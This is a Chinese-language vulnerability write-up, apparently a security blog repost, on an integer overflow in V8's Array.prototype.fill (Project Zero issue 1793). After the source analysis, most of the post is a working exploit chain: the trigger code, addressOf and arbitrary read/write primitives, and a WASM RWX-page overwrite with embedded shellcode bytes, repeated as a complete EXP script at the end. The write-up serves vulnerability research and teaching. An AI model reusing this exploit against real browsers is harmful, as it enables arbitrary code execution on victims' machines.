> 原文链接: https://www.anquanke.com//post/id/231399 


# Chrome issue-1793分析


                                阅读量   
                                **101033**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t01b93b166cf714f150.jpg)](https://p0.ssl.qhimg.com/t01b93b166cf714f150.jpg)



Chrome的`issue-1793`报告了一个`整数溢出`的漏洞，本文将简单对此`issue`进行分析。



## 漏洞分析

在`v8/src/heap/factory.cc`文件的`NewFixedDoubleArray`函数中可以发现开发人员对`length`进行了长度的检查，即`DCHECK_LE(0, length)`。但由于`DCHECK`只在`debug`中起作用，而在`release`中并不起作用，则该检查对正式版本并没有什么作用。如果`length`为负数，则会绕过`if (length &gt; FixedDoubleArray::kMaxLength)`的检查，而由于`int size = FixedDoubleArray::SizeFor(length)`会使用`length`来计算出`size`，如果我们合理控制`length`，则可以让`size`计算出来为正数。

```
// v8/src/heap/factory.cc
Handle&lt;FixedArrayBase&gt; Factory::NewFixedDoubleArray(int length,PretenureFlag pretenure) `{`
  DCHECK_LE(0, length); // ***here***
  if (length == 0) return empty_fixed_array();
  if (length &gt; FixedDoubleArray::kMaxLength) `{` // ***here***
    isolate()-&gt;heap()-&gt;FatalProcessOutOfMemory("invalid array length");
  `}`
  int size = FixedDoubleArray::SizeFor(length); // ***here***
  Map map = *fixed_double_array_map();
  HeapObject result =
    AllocateRawWithImmortalMap(size, pretenure, map, kDoubleAligned);
  Handle&lt;FixedDoubleArray&gt; array(FixedDoubleArray::cast(result), isolate());
  array-&gt;set_length(length);
  return array;
`}`
```

那么我们该如何将负数传递给`NewFixedDoubleArray`呢？我们可以使用`ArrayPrototypeFill`。`ArrayPrototypeFill`在`v8/src/builtins/builtins-array.cc`文件中，其首先会获取最初的数组长度，并使用该长度来对`start`和`end`进行限制。但是在调用`GetRelativeIndex`方法的时候可能会触发用户自定义的JS函数，该自定义函数可能会修改长度，这个行为通常来说可能会导致`OOB`。

```
// v8/src/builtins/builtins-array.cc
BUILTIN(ArrayPrototypeFill) `{`
[...]
  // 2. Let len be ? ToLength(? Get(O, "length")).
  double length;
  MAYBE_ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
      isolate, length, GetLengthProperty(isolate, receiver)); // **here**

  // 3. Let relativeStart be ? ToInteger(start).
  // 4. If relativeStart &lt; 0, let k be max((len + relativeStart), 0);
  //    else let k be min(relativeStart, len).
  Handle&lt;Object&gt; start = args.atOrUndefined(isolate, 2);

  double start_index;
  MAYBE_ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
      isolate, start_index, GetRelativeIndex(isolate, length, start, 0)); // ***here***

  // 5. If end is undefined, let relativeEnd be len;
  //    else let relativeEnd be ? ToInteger(end).
  // 6. If relativeEnd &lt; 0, let final be max((len + relativeEnd), 0);
  //    else let final be min(relativeEnd, len).
  Handle&lt;Object&gt; end = args.atOrUndefined(isolate, 3);

  double end_index;
  MAYBE_ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
      isolate, end_index, GetRelativeIndex(isolate, length, end, length)); // ***here***
[...]
  if (TryFastArrayFill(isolate, &amp;args, receiver, value, start_index,
                       end_index)) `{`
```

接下来会走到`FastElementsAccessor::FillImp`，它在`v8/src/elements.cc`文件中，其会检查`end`是否大于`capacity`,如果是则调用`GrowCapacityAndConvertImpl`函数进行扩容，而该函数又可能会调用`NewFixedDoubleArray`函数。这里的问题在于并没有检查`end`转为有符号数后是否会变成负数，所以我们可以通过将`end`设为诸如`0x80000000`的数字来将负数传递给`NewFixedDoubleArray`，从而导致`OOB`。

```
// v8/src/elements.cc
static Object FillImpl(Handle&lt;JSObject&gt; receiver, Handle&lt;Object&gt; obj_value, uint32_t start, uint32_t end) `{`
  // Ensure indexes are within array bounds
  DCHECK_LE(0, start);
  DCHECK_LE(start, end);

  // Make sure COW arrays are copied.
  if (IsSmiOrObjectElementsKind(Subclass::kind())) `{`
    JSObject::EnsureWritableFastElements(receiver);
  `}`

  // Make sure we have enough space.
  uint32_t capacity =
      Subclass::GetCapacityImpl(*receiver, receiver-&gt;elements());
  if (end &gt; capacity) `{`
    Subclass::GrowCapacityAndConvertImpl(receiver, end); // ***here***
    CHECK_EQ(Subclass::kind(), receiver-&gt;GetElementsKind());
  `}`
```



## 漏洞利用

首先配置`V8`环境，然后还原回漏洞`patch`前的git分支并编译

```
git reset --hard dd68954
gclient sync
./tools/dev/gm.py x64.release
```

编译完成后使用`gdb`进行调试，开启`--allow-natives-syntax`

```
gdb ./d8
pwndbg&gt; set args --allow-natives-syntax ./exp.js
pwndbg&gt; r
```

按照上面所说的的方法，编写出测试代码

```
array = [];
array.length = 0xffffffff;
arr = array.fill(1.1, 0x80000000 - 1, `{`valueOf() `{`
  array.length = 0x100;
  array.fill(1.1);
  return 0x80000000;
`}``}`);

let a = new Array(0x12345678,0); 
let ab = new ArrayBuffer(8); 
%DebugPrint(array);
%DebugPrint(a);
%DebugPrint(ab);
%SystemBreak();
```

运行之后可以得到`array,a,ab`的地址

[![](https://p5.ssl.qhimg.com/t017f37c2f5f7772d20.png)](https://p5.ssl.qhimg.com/t017f37c2f5f7772d20.png)

打印`array`的内存并找到`array-&gt;elements`的地址

[![](https://p5.ssl.qhimg.com/t01edda97c3ad4c65e9.png)](https://p5.ssl.qhimg.com/t01edda97c3ad4c65e9.png)

打印`array-&gt;elements`的内存，可以发现`array-&gt;elements`已经和`a`,`a-&gt;elements`以及`ab`的内存区域重叠了，放两张对比图

正常情况：

[![](https://p5.ssl.qhimg.com/t0147d4829dddba35c9.png)](https://p5.ssl.qhimg.com/t0147d4829dddba35c9.png)

触发漏洞情况：

[![](https://p2.ssl.qhimg.com/t01658638211fa389ec.png)](https://p2.ssl.qhimg.com/t01658638211fa389ec.png)

那么这就造成了`OOB`

接下来通过`a`来构造`addressOf`原语

```
let idx = arr.indexOf(i2f(0x1234567800000000n)); 
function addressOf(obj)
`{`
    a[0] = obj;         
    return f2i(arr[idx]);
`}`
```

然后通过修改`ab`的`backstore指针`来`任意地址读写`

```
let backstore_ptr_idx = arr.indexOf(i2f(8n)) + 1; 
function arb_read(addr)
`{`
    arr[backstore_ptr_idx] = i2f(addr);
    let dv = new DataView(ab); 
    return f2i(dv.getFloat64(0,true)) 
`}`

function arb_write(addr,data)
`{`
    arr[backstore_ptr_idx] = i2f(addr);
    let ua = new Uint8Array(ab); 
    ua.set(data);
`}`
```

最后`WASM`一把梭即可

```
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, `{``}`);
var f = wasmInstance.exports.main;
var wasm_instance_addr = addressOf(wasmInstance) - 1n;
console.log("[+]leak wasm instance addr: " + hex(wasm_instance_addr));
var rwx_page_addr = arb_read(wasm_instance_addr + 0x108n);
console.log("[+]leak rwx_page_addr: " + hex(rwx_page_addr));

const sc = [72, 49, 201, 72, 129, 233, 247, 255, 255, 255, 72, 141, 5, 239, 255, 255, 255, 72, 187, 124, 199, 145, 218, 201, 186, 175, 93, 72, 49, 88, 39, 72, 45, 248, 255, 255, 255, 226, 244, 22, 252, 201, 67, 129, 1, 128, 63, 21, 169, 190, 169, 161, 186, 252, 21, 245, 32, 249, 247, 170, 186, 175, 21, 245, 33, 195, 50, 211, 186, 175, 93, 25, 191, 225, 181, 187, 206, 143, 25, 53, 148, 193, 150, 136, 227, 146, 103, 76, 233, 161, 225, 177, 217, 206, 49, 31, 199, 199, 141, 129, 51, 73, 82, 121, 199, 145, 218, 201, 186, 175, 93];
for(let i = 0; i &lt; sc.length / 8; i++ )`{`
    arb_write(rwx_page_addr + BigInt(i) * 8n ,sc.slice(i * 8,(i + 1) * 8));
`}`

f();
```

结果

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01ecca77b3a115d209.png)



## EXP

```
var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
var Uint32 = new Int32Array(buf);

function f2i(f)
`{`
    float64[0] = f;
    return bigUint64[0];
`}`

function i2f(i)
`{`
    bigUint64[0] = i;
    return float64[0];
`}`


function hex(i)`{`
    return '0x' + i.toString(16).padStart(16, '0');
`}`

array = [];
array.length = 0xffffffff;
arr = array.fill(1.1, 0x80000000 - 1, `{`valueOf() `{`
  array.length = 0x100;
  array.fill(1.1);
  return 0x80000000;

`}``}`);
let a = new Array(0x12345678,0); 
let ab = new ArrayBuffer(8);


let idx = arr.indexOf(i2f(0x1234567800000000n)); 
function addressOf(obj)
`{`
    a[0] = obj;         
    return f2i(arr[idx]);
`}`

let backstore_ptr_idx = arr.indexOf(i2f(8n)) + 1; 
function arb_read(addr)
`{`
    arr[backstore_ptr_idx] = i2f(addr);
    let dv = new DataView(ab); 
    return f2i(dv.getFloat64(0,true)) 
`}`

function arb_write(addr,data)
`{`
    arr[backstore_ptr_idx] = i2f(addr);
    let ua = new Uint8Array(ab); 
    ua.set(data);
`}`

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, `{``}`);
var f = wasmInstance.exports.main;
var wasm_instance_addr = addressOf(wasmInstance) - 1n;
console.log("[+]leak wasm instance addr: " + hex(wasm_instance_addr));
var rwx_page_addr = arb_read(wasm_instance_addr + 0x108n);
console.log("[+]leak rwx_page_addr: " + hex(rwx_page_addr));

const sc = [72, 49, 201, 72, 129, 233, 247, 255, 255, 255, 72, 141, 5, 239, 255, 255, 255, 72, 187, 124, 199, 145, 218, 201, 186, 175, 93, 72, 49, 88, 39, 72, 45, 248, 255, 255, 255, 226, 244, 22, 252, 201, 67, 129, 1, 128, 63, 21, 169, 190, 169, 161, 186, 252, 21, 245, 32, 249, 247, 170, 186, 175, 21, 245, 33, 195, 50, 211, 186, 175, 93, 25, 191, 225, 181, 187, 206, 143, 25, 53, 148, 193, 150, 136, 227, 146, 103, 76, 233, 161, 225, 177, 217, 206, 49, 31, 199, 199, 141, 129, 51, 73, 82, 121, 199, 145, 218, 201, 186, 175, 93];
for(let i = 0; i &lt; sc.length / 8; i++ )`{`
    arb_write(rwx_page_addr + BigInt(i) * 8n ,sc.slice(i * 8,(i + 1) * 8));
`}`

f();
```



## Reference

[https://bugs.chromium.org/p/project-zero/issues/detail?id=1793](https://bugs.chromium.org/p/project-zero/issues/detail?id=1793)

[https://github.com/Geluchat/chrome_v8_exploit/blob/master/1793.js](https://github.com/Geluchat/chrome_v8_exploit/blob/master/1793.js)
